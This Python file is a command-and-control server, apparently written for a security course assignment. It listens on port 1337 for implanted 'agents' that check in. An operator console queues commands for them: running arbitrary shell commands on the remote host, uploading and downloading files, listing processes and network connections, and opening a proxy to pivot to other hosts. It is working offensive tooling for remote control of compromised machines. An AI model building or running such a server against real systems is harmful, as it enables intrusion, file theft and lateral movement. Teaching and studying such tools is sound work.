#!/usr/bin/env python3

from ast import Return
import asyncio
from email.header import Header
from logging import shutdown
from queue import Empty
import random
import re
import signal
from urllib import response
from xmlrpc.client import Boolean

import aioconsole
import struct
import pprint
import os
import colorama
import sys
from colorama import Fore, Style


command_list = (("shutdown", "", "Disconnects and stops active running agent"),
            ("sleep", "[number of sec]", "Call active agent to sleep for x seconds"),
            ("upload", "[target file system path] [local file]", "Copies contents of local file to remote file"),
            ("download", "[target file system path]", "Copies contents of remote host file to local system"),
            ("hostname", "", "Prints out hostname of remote system"),
            ("netstat", "", "Executes netstat command on remote host"),
            ("proclist", "[pid](optional)", "Executes processlist on remote host"),
            ("invoke", "[shell command]", "Invoke shell commands on remote host"),
            ("proxy","[target host] [target port], [local port]", "creates proxy on remote host"),
            )

function_list = ('export')
prompt = ">>"
class Agent:
    """Create an Agent object whenever an agent connectes to track outbound tasks and
    inbound responses. The tasks are stored in an asyncio.Queue which can be awaited
    on.  In you networking code, await on the Queue to know when new commands are added.
    responses is just a regular list because we dont need to be notified asnycronously
    when they arrive. The Queue will store tuples with (command, args), the responses
    will store tuples with (ret_code, message)
    """

    commands: asyncio.Queue[tuple[bytes, bytes]] # byte: command, byte2: args
    responses: list[tuple[int, bytes]]
    name: str
    active: bool

    def __init__(self):
        self.commands = asyncio.Queue(20)
        self.responses = []
        self.name = "agent_" + str(random.randint(100, 999))
        self.status = False

    def __str__(self) -> str:
        return self.name

    def print_responses(self):
        print(f"{self} Responses")
        print(f"{'ndx':>4}|{'size':>7}|{'ret':>4}|{'data':>5}")
        for (i, (ret_code, data)) in enumerate(self.responses):
            print(f"{i:>4}|{len(data):>7}|{ret_code:>4}|{data.__repr__():<.50}")

    def set_status(self, status):
        self.status = status

    def get_status(self):
        return self.status


def get_agent_by_name(name: str, agents_connected: list[Agent]) -> Agent | None:
    """Search the agents_connected list for an agent with name: [name]. This can be a
    useful helper function throughout the code base.

    Args:
        name (str): The name of the agent.
        agents_connected (list[Agent]): the list that contains all the agents.

    Returns:
        Agent | None: The agent with the queried name or None if not found.
    """
    for agent in agents_connected:
        if agent.name == name:
            return agent
    return None

def export_response(response: bytes, filename: str) -> None:
    """Writes the response to the local file system.  You can do as much or as little
    error checking as you wish.

    Args:
        response (bytes): The bytes of the response from the agent.
        filename (str): The local path which will be written to.
    """
    with open(filename, "wb") as file:
        file.write(response)


async def parse_response(reader: asyncio.StreamReader) -> tuple[int, bytes]:
    """Converts the byte stream from the agent to something more useful programatically.
    The default agent returns responses generically as:

    struct response {
        uint32_t total_msg_size;
        uint32_t ret_code;
        uint32_t msg_length;
        char message[msg_length]
    }

    What we care about is the message as bytes (dont eagarly convert to a str because
    a response may not be UTF-8), and the return code.

    Args:
        reader (asyncio.StreamReader): The asyncronous stream from which to read a
                                       single response from.

    Returns:
        tuple[int, bytes]: return a tuple with the return code and the message.
    """
    total_msg = await reader.read(12)
    # print(total_msg)
    message_size, return_code, msg_length = struct.unpack("!III", total_msg)
    message = await reader.read(message_size)
    # print(message_size, return_code, msg_length, message)

    if return_code == 0 or return_code == 1:
        # read_response(message)
        pass
    else:
        print("Error w/ return code: ", return_code)

    data = (return_code, message)

    return data

def read_response(response: bytes):
    """
    Helper function for printing out response from agent
    """
    try:
        response = response.decode()
        response = response.rstrip('\x00')
    except:
        pass
    return response

def create_command(command: bytes, args: bytes) -> bytes:
    """creates a packed stream of bytes that is ready to be sent to the agent.  Use
    this function as a utility to serialize commands.  A command needs to be sent in the
    following format

    struct response {
        uint32_t total_message_size;
        uint32_t command_length;
        char command[command_length];   //NULL TERMINATED
        uint32_t args_length;
        char args[args_length];
    }

    Args:
        command (bytes): the command to be sent
        args (bytes): arguments for the command (these can be wildly differnt, try to
                      split up the functionallity for generating these)

    Returns:
        bytes: a serialized bytestream that can be sent to the agent
    """
    #Added for extra bytes that total message adds
    total_message_size_value = 4

    command_length = len(command)
    command_byte = struct.pack('!I', command_length)
    args_length = len(args)
    args_byte = struct.pack('!I', args_length)
    total_message_size = len(command_byte + command + args_byte + args) + total_message_size_value
    total_message_size_byte = struct.pack('!I', total_message_size)

    byte_stream = total_message_size_byte + command_byte + command + args_byte + args
    return byte_stream
    


def create_upload_arg(src: str, dst: str) -> bytes:
    """The arguments for the upload command are a bit more complicated that the other
    commands. Use this function to generate serialized arguments for the upload command.
    This function may involve reading from files, so add as much or as little error
    checking as you see fit.

    struct upload_args{
        uint32_t dst_file_path_size;
        char file_path[dst_file_path_size];       // NULL TERMINATED
        uint32_t contents_size;
        char contents[contents_size];
    }

    Args:
        src (str): path on the local host
        dst (str): path on the remote host

    Returns:
        bytes: serialzed args for a upload command
    """
    dst_file_path_bytes = dst.encode() + b'\x00'
    dst_file_path_length = len(dst_file_path_bytes)
    dst_file_path_bytes_length = struct.pack("!I", dst_file_path_length)

    with open(src, "rb") as file:
        src_data = file.read()

    src_content_length = len(src_data)
    src_content_bytes_length = struct.pack("!I", src_content_length)
    upload_bytes = dst_file_path_bytes_length + dst_file_path_bytes + src_content_bytes_length + src_data

    return upload_bytes

def create_download_arg(dst: str) -> bytes:

    dst_file_path_bytes = dst.encode() + b'\x00'
    dst_file_path_length = len(dst_file_path_bytes)
    dst_file_path_bytes_length = struct.pack("!I", dst_file_path_length)

    download = dst_file_path_bytes_length + dst_file_path_bytes
    return download





def create_proxy_arg(local_port: str, remote_host: str, remote_port: str) -> bytes:
    """The proxy args are also complicated like the upload args. Please note that the
    arguments that are passed in this function are not in the same order that they are
    sent on the wire.  You may choose to rearrange their order if you wish.

    struct proxy_args {
        uint32_t target_host_len
        char target_host[target_host_len];   //NULL TERMINATED
        uint32_t target_port_len;
        char target_port[target_port_len];
        uint16_t local_port                  // IMPORTANT: localport is a uint16_t while
    }                                        // target port is a NULL TERMINATED string


    Args:
        local_port (str): port to open on the remote host
        remote_host (str): host the proxy will forward to
        remote_port (str): port the poxy will forward to

    Returns:
        bytes: serialized args for the proxy command
    """
    remote_host_bytes = bytes(remote_host, 'utf-8') + b'\x00'
    remote_port_bytes = bytes(remote_port, 'utf-8')

    # remote_port_bytes_2 = struct.pack(">p", remote_port)

    target_host_len = len(remote_host_bytes)
    target_host_len_bytes = struct.pack("!I", target_host_len)
    target_port_len = len(remote_port_bytes)
    target_port_len_bytes = struct.pack("!I", target_port_len)

    local_port_bytes = struct.pack("!H", int(local_port))

    byte_args = target_host_len_bytes + remote_host_bytes + target_port_len_bytes + remote_port_bytes + local_port_bytes

    return byte_args


async def manage_agent(
    agent: Agent, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
):
    """Handler for new agents after they connect.  Use this function as a 'main loop'
    for an individual connection to send and recieve data.  Use the queue on the agent
    object to know when the user wants to send commands then await on the reader to get
    responses.  You can conveniently assume that one request will have one response so
    you can alternate between sending and recieving. The loop should be
    (in pseudo code):

    while connected:
        "wait for command from user"
        "send command to agent"
        "recieve response from agent"

    Args:
        agent (Agent): the agent object tied to this connection
        reader (asyncio.StreamReader): stream to get data from the agent
        writer (asyncio.StreamWriter): stream to send data to the agent
    """
    while True:
        global prompt
        (command, args) = await agent.commands.get()
        command_byte = create_command(command, args)
        print(command_byte)
        writer.write(command_byte)
        await writer.drain()
        return_code, response = await parse_response(reader)
        export_response(response, agent.name)
        response = read_response(response)
        # if response == 'shutting down':
        #     agent.set_status(False)
        #     prompt = ">>"
        #     return agent
        # else:
        # print(response)
        







def client_cb(agents_connected: list[Agent]):
    async def cb(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """This callback will get called each time a new TCP connection is made on the
        server.  use this to setup everything for an agent and start the manage_agent
        loop.  this callback closes over the agents connected param in the parent
        because it cant be passed directly as a param bacause it has to match the
        callback protocol. Use the agents_connected list to add newly connected agents.

        Args:
            reader (asyncio.StreamReader): stream to get data from the agent
            writer (asyncio.StreamWriter): stream to send data to the agent
        """
        agent = Agent()
        agents_connected.append(agent)
        data = await parse_response(reader)
        print(data)
        return_code, response = data
        #TODO Handle failures better
        response = read_response(response)
        if response == "roadrunner checkin":
            print("Connected: " + agent.name)
        else:
            print(response)
        await manage_agent(agent, reader, writer)
        print("Shutting Down: ", agent.name)
        agents_connected.remove(agent)
        

    return cb


async def server(agents_connected: list[Agent]):
    """Start a async tcp server.  This can be as simple or complex as you would like.
    The provided code is the most basic setup, but you could make it more configureabe.
    as a streach you could add ssl here.

    Args:
        agents_connected (list[Agent]): The list containing all connected agents
    """

    server = await asyncio.start_server(client_cb(agents_connected), "0.0.0.0", 1337)
    await server.serve_forever()


async def shell(agents_connected: list[Agent]):
    """Start async shell. In this function, utilize the aioconsole 3rd party library to
    asyncronously wait for input (you may decide to implement this another way without
    aioconsole). this will allow us to wait for user input without blocking the rest of
    the program, including the tcp server code.  This function can be implemented with
    the following pseudo code:

    while True:
        "wait for input"
        "parse the input"
        if "input is command"
            "put command in the right agents queue" (invoke, hostname, shutdown, etc.)
        else
            "perform functions not related to agents" (export, list agents, etc.)


    Args:
        agents_connected (list[Agent]): The list containing all connected agents
    """
    while True:
        global prompt
        #TODO make prompt better
        user_input = await aioconsole.ainput(prompt)
        if not user_input:
            continue    
        command, *args = user_input.split()
        
        match command, args:
            case ("help", args):
                print_shell_help()
            case ("list", args):
                for agent in agents_connected:
                    print("Agent Name: " + agent.name, "Status: " + str(agent.status))
            case ("use", args):
                if get_agent_by_name(args[0], agents_connected) is None:
                    print("Invalid Agent")
                    continue
                for agent in agents_connected:
                    if agent.name == args[0]:
                        agent.set_status(True)
                        prompt = Fore.LIGHTRED_EX + "(" + agent.name + ") " + Style.RESET_ALL + ">>"
                    else:
                        agent.set_status(False)
            case ("exit", args):
                for agent in agents_connected:
                    agent.set_status(False)
                prompt = ">>"
            case ("invoke" | "shutdown" | "sleep" | "hostname" | "netstat" | "proclist" | "download", args):
                for agent in agents_connected:
                    if agent.status == True:
                        if args:
                            args = ' '.join(args)
                            # for arg in args:
                            #     args_str = args_str + ' ' + arg
                            args = args.encode() + b'\x00'
                        else:
                            args = b'\x00'
                        command = bytes(command, 'utf-8') + b'\x00'
                        new_command = (command, args)
                        await agent.commands.put(new_command)
            # upload remote:[filepath] local:[file to upload] # 
            # ex.(upload home/vagrant/Documents/test123.txt test.txt) #
            case ("upload", args):
                for agent in agents_connected:
                    if agent.status == True:
                        dst = args[0]
                        src = os.path.abspath(args[1])
                        command = command.encode()
                        upload = create_upload_arg(src, dst)
                        await agent.commands.put((command, upload))
            case ("proxy", args):
                for agent in agents_connected:
                    if agent.status == True:
                        command = command.encode()
                        target_host = args[0]
                        target_port = args[1]
                        local_port = args[2]
                        proxy = create_proxy_arg(local_port, target_host, target_port)
                        await agent.commands.put((command, proxy))
            case _:
                print("Invalid Command")

def print_shell_help():
    for command in command_list:
        if len(command[1]) != 0:
            command = command[0] + " " + command[1] + " - " + command[2]
        else:
            command = command[0] + " - " + command[2]
        print(command)

async def main():
    """Initializes the agents list and starts the server and shell coroutine"""

    agents_connected: list[Agent] = []
    await asyncio.gather(shell(agents_connected), server(agents_connected))


def sigint_handle(_signum, _frame):
    """Exit the program if the user presses Ctrl+C"""

    print("\nClosing...")
    exit(0)


if __name__ == "__main__":
    """Register signal handler and start main with default event loop"""

    signal.signal(signal.SIGINT, sigint_handle)
    asyncio.run(main())
